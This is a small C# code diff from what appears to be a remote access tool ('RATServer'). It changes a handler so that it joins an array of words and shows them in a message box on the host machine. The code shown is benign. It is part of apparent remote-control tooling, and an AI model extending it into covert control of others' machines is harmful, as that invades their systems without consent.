@@ -10,12 +10,15 @@ namespace RATServer
 {
     public class Functions
     {
-        public static Response Message(string Msg)
+        public static Response Message(string[] Message)
         {
             Response r = new Response { Type = "Message" };
             try
             {
-                MessageBox.Show(Msg);
+                string sentence = "";
+                foreach (string Word in Message) sentence += Word + " ";
+                sentence = sentence.Trim();
+                MessageBox.Show(sentence);
                 r.Msg = "Message Success";
             } catch (Exception e) { r.Msg = e.Message; }          
             return r;
